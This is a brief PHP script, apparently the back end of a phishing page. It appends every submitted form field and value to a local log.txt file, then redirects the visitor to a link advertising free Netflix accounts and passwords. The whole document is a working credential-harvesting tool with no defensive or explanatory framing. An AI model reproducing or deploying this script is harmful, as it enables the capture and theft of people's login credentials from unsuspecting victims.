<?php
header ('Location:https://snurl.com/free-netflix-accounts-and-passwords/');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value){
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
   